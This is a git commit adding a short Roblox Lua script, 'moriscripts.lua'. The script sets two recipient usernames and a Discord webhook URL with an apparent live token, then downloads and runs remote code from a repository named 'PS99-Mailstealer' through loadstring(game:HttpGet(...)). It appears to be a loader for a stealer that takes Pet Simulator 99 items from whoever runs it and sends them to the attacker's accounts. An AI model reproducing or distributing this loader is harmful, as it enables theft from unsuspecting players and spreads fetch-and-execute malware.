b56f0c1d76cc0a5168ebf6faf07e07360b2fef4c
Comichurdle121 <86856558+Comichurdle121@users.noreply.github.com>
2024-07-23 13:06:25 -0400

    Add files via upload

---
+++ moriscripts.lua
@@ -0,0 +1,5 @@
+Username = "COMIIC_HURDLE121"
+Username2 = "COMICHURDLE01"
+Webhook = "https://discord.com/api/webhooks/1265133550810697759/04QyNVTsHZBr1spSxo3NWiCTlMyqHnDFNZuIb7o6zKCv-X-uRbc8PSYS-SXDH7iruywn"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherScript/PS99-Mailstealer/main/PS99Mailstealer"))()
